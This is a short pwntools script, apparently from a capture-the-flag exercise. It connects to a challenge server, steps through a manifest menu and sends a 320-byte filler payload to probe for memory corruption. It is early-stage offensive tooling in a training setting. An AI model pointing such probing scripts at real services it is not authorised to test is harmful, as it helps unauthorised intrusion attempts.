from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

print(recv_menu().decode())
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'10')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'32')
p.recvuntil(b'data:\n')
p.sendline(b'A' * 320)
print(p.recv(1024, timeout=2).decode())

p.close()
